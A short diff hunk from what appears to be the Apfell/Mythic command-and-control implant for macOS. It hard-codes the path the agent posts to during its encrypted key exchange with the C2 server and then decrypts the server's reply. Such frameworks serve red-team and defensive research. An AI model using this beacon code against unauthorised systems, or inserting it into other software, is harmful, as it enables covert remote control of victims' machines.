@@ -99,7 +99,7 @@ class customC2 extends baseC2{
 	    // Encrypt our initial message with sessionID and Public key with the initial AES key
 	    while(true){
 	        try{
-                let base64_pub_encrypted = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(apfell.uuid), initial_message);
+                let base64_pub_encrypted = this.htmlPostData("api/v1.3/crypto/EKE/" + apfell.uuid, initial_message);
                 let pub_encrypted = $.NSData.alloc.initWithBase64Encoding(base64_pub_encrypted.js);
                 let decrypted_message = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, pub_encrypted, err);
                 let json_response = {};
